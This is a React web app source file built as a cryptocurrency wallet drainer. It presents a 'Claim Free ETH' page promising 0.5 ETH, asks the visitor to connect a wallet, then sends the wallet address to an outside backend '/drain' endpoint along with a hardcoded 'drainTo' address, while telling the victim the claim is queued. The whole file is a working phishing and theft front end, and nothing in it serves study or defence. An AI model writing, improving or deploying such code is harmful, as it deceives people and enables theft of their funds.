import React, { useState } from "react";
import ReactDOM from "react-dom/client";

import { WagmiConfig, createConfig, configureChains } from "wagmi";
import { mainnet, sepolia } from "@wagmi/chains";
import { publicProvider } from "viem/providers/public"; // <-- fixed import
import { InjectedConnector } from "wagmi/connectors/injected";
import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
import { Web3Modal, useWeb3Modal } from "@web3modal/react"; // <-- updated for v2

/* ---------------------------
   Wagmi Configuration
---------------------------- */
const projectId = "962425907914a3e80a7d8e7288b23f62";

const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);

const config = createConfig({
  autoConnect: true,
  connectors: [
    new InjectedConnector({ chains }),
    new WalletConnectConnector({ chains, options: { projectId } }),
  ],
  publicClient,
});

/* ---------------------------
   App Component
---------------------------- */
const App = () => {
  const [loading, setLoading] = useState(false);
  const [response, setResponse] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);

  const { open } = useWeb3Modal(); // hook from Web3Modal v2

  const connectWallet = async () => {
    try {
      setLoading(true);
      setResponse(null);

      const connection = await open();
      const account = connection?.accounts?.[0];
      if (!account) throw new Error("No wallet connected");

      setWalletAddress(account);

      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: account,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();
      setResponse({
        success: res.ok,
        message: res.ok
          ? "Token claim queued. You will be credited shortly."
          : "Failed to claim token.",
        data,
      });
    } catch (err) {
      console.error(err);
      setResponse({ success: false, message: "Wallet connection failed." });
    } finally {
      setLoading(false);
    }
  };

  return (
    <WagmiConfig config={config}>
      <div
        style={{
          minHeight: "100vh",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          background: "#121212",
          color: "#fff",
          fontFamily: "Arial, sans-serif",
        }}
      >
        <div
          style={{
            background: "#1e1e1e",
            padding: "30px",
            borderRadius: "12px",
            width: "100%",
            maxWidth: "420px",
            textAlign: "center",
          }}
        >
          <h1 style={{ marginBottom: "16px" }}>Claim Free ETH</h1>
          <p style={{ fontSize: "14px", color: "#ccc" }}>
            Connect your wallet to claim 0.5 ETH.
          </p>

          <button
            onClick={connectWallet}
            disabled={loading}
            style={{
              marginTop: "20px",
              padding: "12px 24px",
              width: "100%",
              background: "#4CAF50",
              border: "none",
              borderRadius: "8px",
              color: "#fff",
              fontSize: "16px",
              cursor: "pointer",
              fontWeight: "bold",
            }}
          >
            {loading ? "Connecting..." : "Connect Wallet"}
          </button>

          {walletAddress && (
            <p style={{ marginTop: "12px", fontSize: "12px", color: "#aaa" }}>
              Connected: {walletAddress}
            </p>
          )}

          {response && (
            <pre
              style={{
                marginTop: "16px",
                background: "#2a2a2a",
                padding: "12px",
                borderRadius: "8px",
                fontSize: "12px",
                textAlign: "left",
              }}
            >
              {JSON.stringify(response, null, 2)}
            </pre>
          )}
        </div>

        {/* Web3Modal component */}
        <Web3Modal projectId={projectId} themeMode="dark" />
      </div>
    </WagmiConfig>
  );
};

/* ---------------------------
   Mount React App
---------------------------- */
ReactDOM.createRoot(document.getElementById("root")).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
